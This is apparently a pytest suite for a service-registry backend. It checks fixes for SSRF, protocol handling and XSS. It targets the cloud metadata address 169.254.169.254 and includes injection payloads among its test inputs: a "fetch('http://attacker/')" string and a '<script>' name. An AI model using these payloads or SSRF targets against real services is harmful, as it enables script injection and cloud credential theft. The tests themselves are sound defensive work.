"""Codex r2 reconcile tests — Campaign 4 final gate, ATHENA-1.

Covers the 5-fix bundle from the codex r2 HEAVY-tier final diff review:

H-1 (Migration 056 date guard): moved to test_phase5_servers_removed.py
  (test_migration_056_date_guard_skips_before_cutoff,
   test_migration_056_date_guard_runs_with_force_flag,
   test_migration_056_sqlite_always_runs)

H-2 (CA upsert ↔ poller field mismatch):
  - parse_endpoint_url() parses host/port/protocol/health_endpoint correctly.
  - POST /api/service-registry/services upsert writes host/port into DB row.
  - Re-upsert (existing row) updates host/port when endpoint_url changes.
  - Invalid scheme → 422.

H-3 (services.py 6 quick-check SSRF gaps):
  - Each of the 6 endpoints returns ssrf_blocked when service host resolves to
    a forbidden range (169.254.169.254 / IMDS).

M-4 (health poller hardcoded http://):
  - _poll_one constructs https:// URL when protocol='https'.
  - _poll_one constructs http:// URL when protocol='http' (default).

M-5 (service name XSS via inline onclick):
  - POST /api/service-registry/services with name matching ^[a-zA-Z0-9_-]{1,64}$
    → 200 / 201.
  - Names with special characters (quotes, spaces, JS injection) → 422.
  - Length boundary: 64 chars → OK, 65 chars → 422.

ATHENA-1 final reconcile (codex r2).
"""
from __future__ import annotations

import asyncio
import os
import sys
import unittest.mock as mock
from typing import Any
from unittest.mock import AsyncMock, MagicMock, patch

_REPO_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..', '..'))
if os.path.join(_REPO_ROOT, 'src') not in sys.path:
    sys.path.insert(0, os.path.join(_REPO_ROOT, 'src'))

_CR2_SERVICE_KEY = "test-service-key-codex-r2"

os.environ["DEV_MODE"] = "true"
os.environ["DATABASE_URL"] = "sqlite:///:memory:"
os.environ["SERVICE_API_KEY"] = _CR2_SERVICE_KEY
os.environ.setdefault("CONTROL_AGENT_ENABLED", "false")

import pytest
from fastapi.testclient import TestClient
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker
from sqlalchemy.pool import StaticPool

from app.database import Base, get_db
from app.models import RagService
from main import app

# ---------------------------------------------------------------------------
# Shared in-memory DB
# ---------------------------------------------------------------------------

engine = create_engine(
    "sqlite:///:memory:",
    connect_args={"check_same_thread": False},
    poolclass=StaticPool,
)
TestingSessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)


@pytest.fixture(autouse=True)
def _reset_config_cache():
    from shared.config import get_config
    os.environ["SERVICE_API_KEY"] = _CR2_SERVICE_KEY
    os.environ["DEV_MODE"] = "true"
    get_config.cache_clear()
    yield
    get_config.cache_clear()


@pytest.fixture(scope="function")
def db():
    Base.metadata.create_all(bind=engine)
    session = TestingSessionLocal()
    try:
        yield session
    finally:
        session.close()
        Base.metadata.drop_all(bind=engine)


@pytest.fixture(scope="function")
def client(db):
    def override_get_db():
        try:
            yield db
        finally:
            pass

    app.dependency_overrides[get_db] = override_get_db
    with TestClient(app) as c:
        yield c
    app.dependency_overrides.clear()


# ---------------------------------------------------------------------------
# H-2: parse_endpoint_url helper
# ---------------------------------------------------------------------------

class TestParseEndpointUrl:
    """Unit tests for app.utils.url_validators.parse_endpoint_url."""

    def test_http_with_path(self):
        from app.utils.url_validators import parse_endpoint_url
        result = parse_endpoint_url("http://athena-rag-weather:8001/health")
        assert result["host"] == "athena-rag-weather"
        assert result["port"] == 8001
        assert result["protocol"] == "http"
        assert result["health_endpoint"] == "/health"

    def test_https_explicit_port(self):
        from app.utils.url_validators import parse_endpoint_url
        result = parse_endpoint_url("https://api.example.com:443")
        assert result["host"] == "api.example.com"
        assert result["port"] == 443
        assert result["protocol"] == "https"
        assert result["health_endpoint"] == "/health"

    def test_http_ip_and_port(self):
        from app.utils.url_validators import parse_endpoint_url
        result = parse_endpoint_url("http://10.0.0.5:8080")
        assert result["host"] == "10.0.0.5"
        assert result["port"] == 8080
        assert result["protocol"] == "http"

    def test_https_no_explicit_port_defaults_to_443(self):
        from app.utils.url_validators import parse_endpoint_url
        result = parse_endpoint_url("https://secure.example.com/v1/health")
        assert result["port"] == 443
        assert result["protocol"] == "https"
        assert result["health_endpoint"] == "/v1/health"

    def test_http_no_explicit_port_defaults_to_80(self):
        from app.utils.url_validators import parse_endpoint_url
        result = parse_endpoint_url("http://myservice")
        assert result["port"] == 80
        assert result["protocol"] == "http"

    def test_root_path_normalised_to_health(self):
        from app.utils.url_validators import parse_endpoint_url
        result = parse_endpoint_url("http://svc:8000/")
        assert result["health_endpoint"] == "/health"

    def test_empty_path_normalised_to_health(self):
        from app.utils.url_validators import parse_endpoint_url
        result = parse_endpoint_url("http://svc:8000")
        assert result["health_endpoint"] == "/health"

    def test_invalid_scheme_raises(self):
        from app.utils.url_validators import parse_endpoint_url
        with pytest.raises(ValueError, match="not allowed"):
            parse_endpoint_url("ftp://example.com/thing")

    def test_no_hostname_raises(self):
        from app.utils.url_validators import parse_endpoint_url
        with pytest.raises(ValueError):
            parse_endpoint_url("http://")


# ---------------------------------------------------------------------------
# H-2: POST upsert writes host/port into DB
# ---------------------------------------------------------------------------

class TestUpsertWritesHostPort:
    """POST /api/service-registry/services must populate host/port columns."""

    def test_create_upsert_populates_host_port(self, client, db):

        resp = client.post(
            "/api/service-registry/services",
            params={
                "name": "rag-weather",
                "endpoint_url": "http://athena-rag-weather:8010/health",
            },
            headers={"X-Service-Key": _CR2_SERVICE_KEY},
        )
        assert resp.status_code == 200, resp.text

        db.expire_all()
        svc = db.query(RagService).filter(RagService.name == "rag-weather").first()
        assert svc is not None
        assert svc.host == "athena-rag-weather"
        assert svc.port == 8010
        assert svc.protocol == "http"
        assert svc.health_endpoint == "/health"

    def test_update_upsert_refreshes_host_port(self, client, db):

        # Create
        client.post(
            "/api/service-registry/services",
            params={
                "name": "rag-stocks",
                "endpoint_url": "http://athena-rag-stocks:8012/health",
            },
            headers={"X-Service-Key": _CR2_SERVICE_KEY},
        )
        # Re-upsert with a different URL
        resp = client.post(
            "/api/service-registry/services",
            params={
                "name": "rag-stocks",
                "endpoint_url": "http://athena-rag-stocks-v2:9012/healthz",
            },
            headers={"X-Service-Key": _CR2_SERVICE_KEY},
        )
        assert resp.status_code == 200
        data = resp.json()
        assert data["action"] == "updated"

        db.expire_all()
        svc = db.query(RagService).filter(RagService.name == "rag-stocks").first()
        assert svc.host == "athena-rag-stocks-v2"
        assert svc.port == 9012
        assert svc.health_endpoint == "/healthz"

    def test_upsert_https_service(self, client, db):

        resp = client.post(
            "/api/service-registry/services",
            params={
                "name": "secure-svc",
                "endpoint_url": "https://secure.example.com:443/health",
            },
            headers={"X-Service-Key": _CR2_SERVICE_KEY},
        )
        assert resp.status_code == 200

        db.expire_all()
        svc = db.query(RagService).filter(RagService.name == "secure-svc").first()
        assert svc.protocol == "https"
        assert svc.port == 443

    def test_upsert_invalid_scheme_422(self, client, db):

        resp = client.post(
            "/api/service-registry/services",
            params={
                "name": "bad-svc",
                "endpoint_url": "ftp://example.com/thing",
            },
            headers={"X-Service-Key": _CR2_SERVICE_KEY},
        )
        assert resp.status_code == 422


# ---------------------------------------------------------------------------
# H-3: services.py 6 quick-check SSRF guard
# ---------------------------------------------------------------------------

class TestQuickCheckSSRFGuard:
    """6 quick-check endpoints must return ssrf_blocked for forbidden hosts."""

    IMDS_IP = "169.254.169.254"

    def _seed_service(self, db, name: str, host: str, port: int, protocol: str = "http"):
        svc = RagService(
            name=name,
            display_name=name,
            host=host,
            port=port,
            protocol=protocol,
            health_endpoint="/health",
            service_type="infrastructure",
            enabled=True,
        )
        db.add(svc)
        db.commit()
        return svc

    @pytest.mark.parametrize("endpoint,service_name,seed_port", [
        ("/api/services/gateway/health", "gateway", 8000),
        ("/api/services/orchestrator/health", "orchestrator", 8001),
        ("/api/services/ollama/health", "ollama", 11434),
        ("/api/services/qdrant/health", "qdrant", 6333),
        ("/api/services/mlx/health", "mlx", 8080),
    ])
    def test_http_endpoints_ssrf_blocked(self, endpoint, service_name, seed_port, client, db):
        """Endpoints backed by aiohttp must refuse IMDS hosts."""

        self._seed_service(db, service_name, self.IMDS_IP, seed_port)

        resp = client.get(endpoint)
        assert resp.status_code == 200, resp.text
        data = resp.json()
        assert data.get("status") == "ssrf_blocked", (
            f"{endpoint} must return ssrf_blocked for IMDS host, got: {data}"
        )

    def test_redis_endpoint_ssrf_blocked(self, client, db, monkeypatch):
        """Redis socket endpoint must refuse IMDS host."""

        self._seed_service(db, "redis", self.IMDS_IP, 6379)

        resp = client.get("/api/services/redis/health")
        assert resp.status_code == 200
        data = resp.json()
        assert data.get("status") == "ssrf_blocked", (
            f"redis health endpoint must return ssrf_blocked for IMDS host, got: {data}"
        )


# ---------------------------------------------------------------------------
# M-4: health poller uses service.protocol
# ---------------------------------------------------------------------------

class TestPollOneUsesProtocol:
    """_poll_one must construct the URL with the stored protocol."""

    @pytest.mark.asyncio
    async def test_https_service_polled_with_https(self):
        from app.services.health_poller import _poll_one

        captured_urls: list[str] = []

        class FakeResp:
            status_code = 200
            def json(self):
                return {"status": "ok"}

        async def fake_get(url, **kwargs):
            captured_urls.append(url)
            return FakeResp()

        mock_client = AsyncMock()
        mock_client.get = fake_get

        semaphore = asyncio.Semaphore(1)

        # Patch _validate_service_url to always allow (we're testing URL construction,
        # not SSRF guard logic).
        with mock.patch("app.services.health_poller._validate_service_url", return_value=(True, "")):
            await _poll_one(mock_client, semaphore, 1, "secure-svc", "secure.example.com", 443, "/health", "https")

        assert len(captured_urls) == 1
        assert captured_urls[0].startswith("https://"), (
            f"Expected https:// URL, got {captured_urls[0]}"
        )

    @pytest.mark.asyncio
    async def test_http_service_polled_with_http(self):
        from app.services.health_poller import _poll_one

        captured_urls: list[str] = []

        class FakeResp:
            status_code = 200
            def json(self):
                return {"status": "ok"}

        async def fake_get(url, **kwargs):
            captured_urls.append(url)
            return FakeResp()

        mock_client = AsyncMock()
        mock_client.get = fake_get

        semaphore = asyncio.Semaphore(1)

        with mock.patch("app.services.health_poller._validate_service_url", return_value=(True, "")):
            await _poll_one(mock_client, semaphore, 2, "plain-svc", "plain.example.com", 8001, "/health", "http")

        assert captured_urls[0].startswith("http://")
        assert not captured_urls[0].startswith("https://")

    @pytest.mark.asyncio
    async def test_unknown_protocol_falls_back_to_http(self):
        from app.services.health_poller import _poll_one

        captured_urls: list[str] = []

        class FakeResp:
            status_code = 200
            def json(self):
                return {}

        async def fake_get(url, **kwargs):
            captured_urls.append(url)
            return FakeResp()

        mock_client = AsyncMock()
        mock_client.get = fake_get
        semaphore = asyncio.Semaphore(1)

        with mock.patch("app.services.health_poller._validate_service_url", return_value=(True, "")):
            await _poll_one(mock_client, semaphore, 3, "weird-svc", "svc.example.com", 9000, "/health", "ftp")

        assert captured_urls[0].startswith("http://"), (
            "Unknown protocol must fall back to http, not ftp"
        )


# ---------------------------------------------------------------------------
# M-5: service name regex enforcement
# ---------------------------------------------------------------------------

class TestServiceNameRegex:
    """POST /api/service-registry/services must enforce the name allowlist."""

    @pytest.mark.parametrize("name", [
        "valid-name",
        "valid_name",
        "ValidName123",
        "a" * 64,
        "weather",
        "rag-weather",
    ])
    def test_valid_names_accepted(self, name, client, db):

        resp = client.post(
            "/api/service-registry/services",
            params={
                "name": name,
                "endpoint_url": "http://athena-rag-weather:8010/health",
            },
            headers={"X-Service-Key": _CR2_SERVICE_KEY},
        )
        # Either created (200) or conflict (if duplicate) — not 422.
        assert resp.status_code in (200, 400), (
            f"Valid name {name!r} was rejected: {resp.status_code} {resp.text}"
        )

    @pytest.mark.parametrize("name,description", [
        ("foo'); fetch('http://attacker/')", "JS injection with single quote"),
        ("valid name with space", "name with space"),
        ("name/with/slashes", "name with slashes"),
        ("name<script>", "name with HTML"),
        ('name"quote', "name with double quote"),
        ("a" * 65, "name exceeding 64 chars"),
        ("", "empty name"),
    ])
    def test_invalid_names_rejected(self, name, description, client, db):

        resp = client.post(
            "/api/service-registry/services",
            params={
                "name": name,
                "endpoint_url": "http://athena-rag-weather:8010/health",
            },
            headers={"X-Service-Key": _CR2_SERVICE_KEY},
        )
        assert resp.status_code == 422, (
            f"Invalid name ({description}) should be 422, got {resp.status_code}: {resp.text}"
        )

    def test_oss_service_names_all_pass_regex(self):
        """All 24 OSS seed service names must match the new regex.

        If this fails, the regex is too restrictive and would break the default
        seed on a fresh deployment.
        """
        import re
        from app.database import OSS_SERVICE_REGISTRY

        pattern = re.compile(r'^[a-zA-Z0-9_-]{1,64}$')
        failures = [
            name for name, *_ in OSS_SERVICE_REGISTRY
            if not pattern.match(name)
        ]
        assert not failures, (
            f"OSS_SERVICE_REGISTRY names that fail the new regex: {failures}"
        )
